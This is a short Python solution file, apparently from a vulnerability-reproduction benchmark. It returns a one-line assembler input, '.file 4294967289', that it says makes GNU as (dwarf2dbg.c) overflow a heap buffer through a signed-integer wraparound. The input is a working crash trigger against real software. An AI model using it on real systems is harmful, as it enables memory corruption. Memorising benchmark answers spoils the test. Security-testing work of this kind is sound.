import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability in gas/dwarf2dbg.c is triggered by a large file index
        # in the .file directive, which is treated as a signed integer (negative),
        # bypassing bounds checks and causing a heap buffer overflow.
        # 4294967289 (0xFFFFFFF9) corresponds to -7 when cast to a 32-bit signed int.
        return b'.file 4294967289 "x"\n'